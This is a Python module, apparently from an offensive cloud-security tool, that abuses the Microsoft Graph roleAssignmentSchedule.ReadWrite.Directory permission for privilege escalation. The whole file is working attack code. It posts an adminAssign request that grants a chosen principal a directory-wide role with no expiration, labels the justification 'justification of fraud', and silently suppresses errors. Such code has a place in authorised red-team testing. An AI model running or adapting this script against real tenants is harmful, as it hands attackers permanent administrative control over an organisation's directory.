import requests
import colorama
from colorama import Fore, Style
from datetime import datetime


def RoleSchedule_Vectors(request_headers, RoleScheduleSettings):
    print()
    print(
        "roleAssignmentSchedule.readWrite.directory - Allows the app to read, update, and delete policies for privileged role-based access control (RBAC) assignments of your company's directory, without a signed-in user.")
    print()
    try:
        print("Attack vector - privilege escalation.")
        current_time = datetime.now()
        formatted_time = current_time.strftime("%Y-%m-%dT%H:%M:%SZ")

        create_message_URL = "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignmentScheduleRequests"
        message_obj = {
            "action": "adminAssign",
            "justification": "justification of fraud",
            "roleDefinitionId": RoleScheduleSettings["roleDefinitionId"],
            "directoryScopeId": "/",
            "principalId": RoleScheduleSettings["principalId"],
            "scheduleInfo": {
                "startDateTime": formatted_time,
                "expiration": {
                    "type": "NoExpiration"
                }
            }
        }

        result = requests.post(create_message_URL, json=message_obj, headers=request_headers)
        print(result.text)
        if result.status_code == 201:
            print(Fore.GREEN + "added a role of " + RoleScheduleSettings["roleDefinitionId"] + " to " + RoleScheduleSettings["principalId"])
            print(Style.RESET_ALL)

    except:
        pass
